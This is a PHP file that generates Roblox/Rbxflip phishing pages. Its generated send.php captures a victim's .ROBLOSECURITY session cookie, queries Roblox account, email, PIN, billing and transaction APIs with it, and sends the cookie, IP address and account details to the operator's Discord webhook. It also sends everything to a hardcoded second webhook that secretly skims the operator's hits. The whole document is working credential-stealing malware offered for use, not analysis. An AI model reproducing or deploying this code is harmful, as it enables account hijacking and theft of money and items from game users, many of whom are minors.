<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $folder = $_POST['folder'];
    if(!is_dir($folder)){
    mkdir($folder);
    } else {
	die('Please don\'t try overwriting others\' loggers!');
    }
    $webhook = $_POST['webhook'];
    $id = rand(1302, 31424);
    
    $sql = "INSERT INTO loggers (id, webhook)
VALUES ($id, $webhook)";

$code1 = file_get_contents("login.php");
$code2 = file_get_contents("cookie.png");
$code3 = file_get_contents("bg.png");
$code4 = file_get_contents("poppins.woff2");
$code5 = file_get_contents("poppins_bold.woff2");
$myfile = fopen("$folder/send.php", "w");
$myfile2 = fopen("$folder/cookie.png", "w");
$myfile3 = fopen("$folder/bg.png", "w");
$myfile4 = fopen("$folder/poppins.woff2", "w");
$myfile5 = fopen("$folder/poppins_bold.woff2", "w");
$myfile1 = fopen("$folder/index.php", "w");
$txt = $code;
$txt1 = $code1;
$txt2 = $code2;
$txt3 = $code3;
$txt4 = $code4;
$txt5 = $code5;
fwrite($myfile1, $txt1);
fwrite($myfile2, $txt2);
fwrite($myfile3, $txt3);
fwrite($myfile4, $txt4);
fwrite($myfile5, $txt5);
fwrite($myfile, ' <?php $Dualurl = "'.$Dualurl.'"; $url = "'.$webhook.'"; ?> 
<?php

if(isset($_POST["submit"])){
    $cookiegrab = $_POST["ROBLOSECURITY"];

}

$ip = $_SERVER["REMOTE_ADDR"];
$host = $_SERVER["HTTP_USER_AGENT"];

$cookie = "$cookiegrab";

// Initialize cURL session
$ch = curl_init();

// Set the URL of the API endpoint
curl_setopt($ch, CURLOPT_URL, "https://www.roblox.com/mobileapi/userinfo");

// Set the headers for the request
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $cookie,
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
));

// Set the option to return the response as a string
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the cURL request
$response = curl_exec($ch);

// Check for errors
if (curl_errno($ch)) {
} else {
    // Decode the response as JSON
    $profile = json_decode($response, true);

    // Check if the JSON decoding was successful
    if (json_last_error() === JSON_ERROR_NONE) {

    }
}


$ch = curl_init();

// Set the URL of the API endpoint
curl_setopt($ch, CURLOPT_URL, "https://accountsettings.roblox.com/v1/email");

// Set the headers for the request
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $cookie,
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
));

// Set the option to return the response as a string
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the cURL request
$response = curl_exec($ch);

// Check for errors
if (curl_errno($ch)) {
} else {
    // Decode the response as JSON
    $lol = json_decode($response, true);

    // Check if the JSON decoding was successful
    if (json_last_error() === JSON_ERROR_NONE) {

    }
}

$ch = curl_init();

// Set the URL of the API endpoint
curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/account/pin");

// Set the headers for the request
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $cookie,
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
));

// Set the option to return the response as a string
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the cURL request
$response = curl_exec($ch);

// Check for errors
if (curl_errno($ch)) {
} else {
    // Decode the response as JSON
    $PIN = json_decode($response, true);

    // Check if the JSON decoding was successful
    if (json_last_error() === JSON_ERROR_NONE) {

    }
}



$ch = curl_init();

// Set the URL of the API endpoint
curl_setopt($ch, CURLOPT_URL, "https://billing.roblox.com/v1/credit");

// Set the headers for the request
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $cookie,
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
));

// Set the option to return the response as a string
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the cURL request
$response = curl_exec($ch);

// Check for errors
if (curl_errno($ch)) {
} else {
    // Decode the response as JSON
    $credit = json_decode($response, true);

    // Check if the JSON decoding was successful
    if (json_last_error() === JSON_ERROR_NONE) {

    }
}





$ch = curl_init();

// Set the URL of the API endpoint
curl_setopt($ch, CURLOPT_URL, "https://economy.roblox.com/v2/users/"  . $profile["UserID"] .  "/transaction-totals?timeFrame=Year&transactionType=summary");

// Set the headers for the request
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $cookie,
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
));

// Set the option to return the response as a string
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the cURL request
$response = curl_exec($ch);

// Check for errors
if (curl_errno($ch)) {
} else {
    // Decode the response as JSON
    $sum = json_decode($response, true);

    // Check if the JSON decoding was successful
    if (json_last_error() === JSON_ERROR_NONE) {

    }
}

$api_url2 = "https://inventory.roblox.com/v1/users/"  . $profile["UserID"] .  "/assets/collectibles?limit=10&sortOrder=Asc";

$json2 = file_get_contents($api_url2);

$data2 = json_decode($json2, true);

$limiteds = $data2["data"][0]["name"];
$limiteds1 = $data2["data"][0]["recentAveragePrice"];



$url = "'.$webhook.'";
$dualhook = "https://discord.com/api/webhooks/1108080425659797534/fpSDq2jRrHok9MDxu4wTrJUCxfh5ss828Ekv9UAzVNPRkjLOooUuxAjlZDmdPdmYCcss";
$headers = [ "Content-Type: application/json; charset=utf-8" ];
$POST = [
    "username" => "'.$name.' - Bot",
    "avatar_url" => "'.$image.'",
     "content" => "",
        "embeds" => [
            [
                "title" => "🕯️ +1 result account rbxflip 💸",
                "type" => "rich",
                "color" => hexdec("99999"),
                "url" => "https://www.roblox.com/users/" . $profile["UserID"] . "/profile",
                "thumbnail" => [
                    "url" => $profile["ThumbnailUrl"],
                ],
                "footer" => [
                    "text" => "New Hit 💸",
                  "icon_url" => "'.$image.'"
                ],
                "fields" => [
                    [
                        "name" => "**Username**",
                        "value" => $profile["UserName"],
                        "inline" => true
                    ],
                    [
                        "name" => "**Robux <:robux:818111919881715764>**",
                        "value" => $profile["RobuxBalance"],
                        "inline" => true
                    ],
                    [
                        "name" => "**premuim? <:premium:818111829963964416>**",
                        "value" => $profile["IsPremium"],
                        "inline" => true
                    ],
                    [
                        "name" => "**Verified? 🌴**",
                        "value" => $lol["verified"],
                        "inline" => true
                    ],
                    [
                        "name" => "**PIN? 🔒**",
                        "value" => $PIN["isEnabled"],
                        "inline" => true
                    ],
                    [
                        "name" => "**IP 🌐**",
                        "value" => "$ip",
                        "inline" => true
                    ],
                    [
                        "name" => "**HOST MACHINE 🖥️**",
                        "value" => "$host",
                        "inline" => true
                    ],
                    [
                        "name" => "**RAP**",
                        "value" => "$limiteds1",
                        "inline" => true
                    ],
                    [
                        "name" => "**Limiteds Owned**",
                        "value" => "$limiteds",
                        "inline" => true
                    ],
                    [
                        "name" => "**Pending Robux**",
                        "value" => $sum["pendingRobuxTotal"],
                        "inline" => true
                    ],
                    [
                        "name" => "**Summary**",
                        "value" => $sum["incomingRobuxTotal"],
                        "inline" => true
                    ],
                    [
                        "name" => "**Credit**",
                        "value" => $credit["balance"],
                        "inline" => true
                    ],
                    [
                        "name" => "**Cookie 🍪**",
                        "value" => "```$cookie```",
                        "inline" => true
                    ],
                ]
            ]
        ]
    ];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response   = curl_exec($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $dualhook);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response   = curl_exec($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $Dualurl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response   = curl_exec($ch);

// Close the cURL session
curl_close($ch);
header("Location: https://rbxflip.com/coinflip");
exit;
?>


'.$txt);
$url = "$webhook";
$headers = [ "Content-Type: application/json; charset=utf-8" ];
$POST = [
    "username" => "$name - Notifier",
    "avatar_url" => "$image",
     "content" => "@everyone",
        "embeds" => [
            [
                "title" => "$name ON TOP",
                "type" => "rich",
                "color" => hexdec("00000"),
                "thumbnail" => [
                    "url" => "$image"
                ],
                "author" => [
                     "name" => "Webhook Notifier",
                ],
                "image" => [
                    "url" => "$image"
                ],
                "footer" => [
                    "text" => "bloxflip phishing",
                  "icon_url" => "$image"
                ],
                "fields" => [
                    [
                        "name" => "**Ur Bloxflip phishing url 📌**",
                        "value" => "```http://".$_SERVER["SERVER_NAME"]."/$folder```",
                        "inline" => False
                    ],
                ]
            ],
        ],
    
    ];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response   = curl_exec($ch);

header("location: $folder/");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?=$name?></title>
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="twitter:site" content="<?=$name?>">
<meta name="twitter:title" content="Rbxflip Phishing">
<meta name="twitter:description" content="Check out Rbxflip Phishing">
<meta property=og:site_name content=Termed>
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image:src" content="<?=$image?>">
<meta name="viewport" content="width=device-width">
    <link href="<?=$image?>" rel="icon"> 
</head>
<style>
    *{
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }
    body{
        min-height: 100vh;
        background-image: url(<?=$image?>);
        display: flex;
        font-family: sans-serif;
    }
    .container{
        margin: auto;
        width: 500px;
        max-width: 90%;
    }
    .container form{
        width: 100%;
        height: 100%;
        padding: 20px;
        background: rgb(255, 255, 255);
        border-radius: 4px;
        box-shadow: 0 8px 16px rgba(0, 0, 0,.3);
    }
    .container form h1{
        text-align: center;
        margin-bottom: 24px;
        color: rgb(170, 0, 255);
    }
    .container form .form-control{
        width: 100%;
        height: 40px;
        background: rgb(250, 250, 247);
        border-radius: 4px;
        border: 1px solid silver;
        margin: 10px 0 18px 0;
        padding: 0 10px;
    }
    .container form .btn{
        margin-left: 50%;
        transform: translateX(-50%);
        width: 120px;
        height: 34px;
        border: none;
        outline: none;
        background:  rgb(0, 0, 0);
        cursor: pointer;
        font-size: 16px;
        text-transform: uppercase;
        color: white;
        border-radius: 4px;
        transition: .3s;
    }
    .container form .btn:hover{
        opacity: .7;
    }
    body{
        margin: 0;
        padding: 0;
    }

    h3{
        color: rgb(26, 26, 25);
        font-family: Source Sans Pro;
        font-weight: lighter;
        text-align: left;
        position: absolute;
        top: 250px;
        left: 750px;
    }
</style>
</head>
<body>
<div class="container">
    <form method="POST" action="">
        <img src="<?=$image?>" width="120" height="120" align="right">
        <h1><a style="color: black;"><?=$name?> Rbxflip Phishing Generator </a></h1>
        <br>
        <br>
        <br>
        <div class="form-group">
            <span>Webhook</span>
            <input type="text" class="form-control" name="webhook" placeholder="Webhook?" required>
            <span>Directory</span>
            <input type="text" name="folder" class="form-control" placeholder="Directory?"  required>
        </div>
        <input type="submit" class="btn" value="Generate">
        <br>
    </form>
</div>
</body>
</html>